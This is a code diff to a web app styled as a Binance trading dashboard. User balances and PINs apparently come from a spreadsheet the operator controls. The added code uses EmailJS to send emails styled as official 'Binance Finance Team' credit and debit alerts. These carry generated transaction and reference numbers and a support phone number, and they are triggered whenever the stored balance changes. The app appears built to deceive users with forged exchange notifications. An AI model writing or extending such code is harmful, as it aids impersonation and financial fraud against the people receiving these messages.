@@ -422,7 +422,10 @@
 <!-- PAYMENT MODAL -->
 <div id="paymentModal" class="modal"><div class="modal-content"><span class="modal-close" onclick="closeModal('paymentModal')">&times;</span><h2 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-credit-card mr-2"></i>Add Funds</h2><div class="payment-method" onclick="showToast('Bank Transfer selected', true)"><i class="fa-solid fa-building-columns text-2xl text-yellow-500"></i><div><p class="text-white font-bold">Bank Transfer</p><p class="text-gray-400 text-xs">1-3 business days</p></div></div><div class="payment-method" onclick="showToast('Credit Card selected', true)"><i class="fa-brands fa-cc-visa text-2xl text-yellow-500"></i><div><p class="text-white font-bold">Credit/Debit Card</p><p class="text-gray-400 text-xs">Instant</p></div></div><div class="payment-method" onclick="showToast('Crypto Transfer selected', true)"><i class="fa-brands fa-bitcoin text-2xl text-yellow-500"></i><div><p class="text-white font-bold">Crypto Transfer</p><p class="text-gray-400 text-xs">15-30 minutes</p></div></div><div class="payment-method" onclick="showToast('PayPal selected', true)"><i class="fa-brands fa-paypal text-2xl text-yellow-500"></i><div><p class="text-white font-bold">PayPal</p><p class="text-gray-400 text-xs">Instant</p></div></div></div></div>
 
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
+    emailjs.init("hZRpyfGu_UV6nvL9S");
+    
     const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
     let currentUserEmail = null;
     let currentBalance = 12500;
@@ -431,6 +434,7 @@
     let allocationChart = null;
     let isBalanceHidden = true;
     let liveChartInterval = null;
+    let lastKnownBalance = null;
 
     // Initialize TradingView Widget
     function initTradingView() {
@@ -847,6 +851,113 @@
     function showView(viewId) { document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active')); document.getElementById('view-' + viewId).classList.add('active'); document.querySelectorAll('[id^="nav-"]').forEach(n => { n.classList.remove('nav-item-active'); n.classList.add('text-gray-500'); }); document.getElementById('nav-' + viewId).classList.add('nav-item-active'); lucide.createIcons(); }
     function updatePricesSilently() { fetch('https://api.binance.com/api/v3/ticker/24hr?symbols=["BTCUSDT","BNBUSDT"]').then(res => res.json()).then(data => { if (data && data.length) { data.forEach(coin => { const idPrefix = coin.symbol === "BTCUSDT" ? 'btc' : 'bnb'; const priceEl = document.getElementById(idPrefix + '-price'); const changeEl = document.getElementById(idPrefix + '-change'); if(priceEl) priceEl.innerText = parseFloat(coin.lastPrice).toLocaleString(undefined, { minimumFractionDigits: 2 }); if(changeEl) { const pct = parseFloat(coin.priceChangePercent).toFixed(2); changeEl.innerText = (pct >= 0 ? '+' : '') + pct + '%'; changeEl.className = pct >= 0 ? "success-green text-[10px] font-bold" : "text-red-500 text-[10px] font-bold"; } }); } }).catch(err => console.log('Price update failed', err)); }
     
+    // Email notification function for balance changes
+    async function sendBalanceAlertEmail(previousBalance, newBalance, transactionType, amountChanged) {
+        const userEmail = currentUserEmail;
+        if (!userEmail) return;
+        
+        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' UTC';
+        const transactionId = `BIN-${transactionType === 'CREDIT' ? 'CR' : 'DB'}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
+        const senderId = `BIN-${Math.random().toString(36).substring(2, 15).toUpperCase()}`;
+        const referenceNumber = `REF-${new Date().getFullYear()}${String(new Date().getMonth()+1).padStart(2,'0')}${String(new Date().getDate()).padStart(2,'0')}-${Math.floor(Math.random() * 100000000)}`;
+        
+        const previousBalanceDollars = (previousBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        const newBalanceDollars = (newBalance / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        const amountChangedDollars = (amountChanged / 100).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        
+        let subject = '';
+        let alertType = '';
+        let icon = '';
+        let actionText = '';
+        
+        if (transactionType === 'CREDIT') {
+            subject = `💰 Binance Credit Alert - Funds Received`;
+            alertType = 'CREDIT';
+            icon = '💰';
+            actionText = 'The credited amount has been added to your available balance and is ready for trading, withdrawal, or transfer.';
+        } else {
+            subject = `💸 Binance Debit Alert - Withdrawal Processed`;
+            alertType = 'DEBIT';
+            icon = '💸';
+            actionText = 'If you did NOT authorize this transaction, please contact Binance Support immediately.';
+        }
+        
+        const emailBody = `
+╔══════════════════════════════════════════════════════════════════╗
+║                        B I N A N C E                             ║
+║                    ${alertType} Alert Notification               ║
+╚══════════════════════════════════════════════════════════════════╝
+
+Sender ID: ${senderId}
+
+Dear Valued Customer,
+
+Your Binance account has been successfully ${transactionType === 'CREDIT' ? 'credited' : 'debited'}.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  ${icon} ${alertType} DETAILS
+  ────────────────────────────────────────────────────────────────
+  • Amount ${transactionType === 'CREDIT' ? 'Credited' : 'Debited'}:   ${transactionType === 'CREDIT' ? '+' : '-'}$${amountChangedDollars} USD
+  • Previous Balance:   $${previousBalanceDollars} USD
+  • Current Balance:    $${newBalanceDollars} USD
+  • Date & Time:        ${timestamp}
+  • Transaction ID:     ${transactionId}
+  • Reference Number:   ${referenceNumber}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  ${transactionType === 'CREDIT' ? '✅ FUNDS ARE NOW AVAILABLE' : '⚠️ DIDN\'T REQUEST THIS TRANSACTION?'}
+  ────────────────────────────────────────────────────────────────
+  ${actionText}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  📞 NEED ASSISTANCE?
+  ────────────────────────────────────────────────────────────────
+  • Support Portal:    https://www.binance.com/en/support
+  • Live Chat:         24/7 Available
+  • Emergency Line:    +1 (888) 908-7930
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This is an automated ${transactionType === 'CREDIT' ? 'credit' : 'debit'} alert. Please do not reply directly to this email.
+
+Best regards,
+Binance Finance Team
+
+© 2026 Binance. All rights reserved.
+        `;
+        
+        try {
+            const templateParams = {
+                to_email: userEmail,
+                subject: subject,
+                message: emailBody
+            };
+            
+            const response = await emailjs.send('service_mb8a3ro', 'template_x0b1jrr', {
+                to_email: userEmail,
+                subject: subject,
+                message: emailBody
+            });
+            
+            if (response.status === 200) {
+                console.log('Balance alert email sent successfully');
+                // Professional toast message for Credit/Debit
+                if (transactionType === 'CREDIT') {
+                    showToast('✓ CREDIT ALERT: Funds have been successfully credited to your Binance account. Check your email for full transaction details.', true);
+                } else {
+                    showToast('⚠️ DEBIT ALERT: A withdrawal has been processed from your Binance account. If this was not you, contact support immediately.', true);
+                }
+            } else {
+                console.log('Failed to send email');
+            }
+        } catch (error) {
+            console.error('Email send error:', error);
+        }
+    }
+    
     async function checkSession() { 
         const savedEmail = localStorage.getItem('binance_session_email'); 
         if (savedEmail) { 
@@ -856,8 +967,25 @@
                 const response = await fetch(`${API_URL}`);
                 const users = await response.json();
                 const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
-                currentBalance = user && user.Balance ? parseFloat(user.Balance) : 10000;
+                const newBalance = user && user.Balance ? parseFloat(user.Balance) : 10000;
+                
+                // Check if balance has changed since last known balance
+                const storedBalance = localStorage.getItem('last_known_balance');
+                if (storedBalance !== null && parseFloat(storedBalance) !== newBalance) {
+                    const previousBalance = parseFloat(storedBalance);
+                    const amountChanged = Math.abs(newBalance - previousBalance);
+                    const transactionType = newBalance > previousBalance ? 'CREDIT' : 'DEBIT';
+                    
+                    // Send email alert for balance change
+                    await sendBalanceAlertEmail(previousBalance, newBalance, transactionType, amountChanged);
+                }
+                
+                currentBalance = newBalance;
                 currentUserPin = user && user.Pin ? user.Pin : null;
+                
+                // Store current balance as last known
+                localStorage.setItem('last_known_balance', currentBalance);
+                
             } catch (error) {
                 console.error('Failed to fetch user data:', error);
                 currentBalance = 10000;
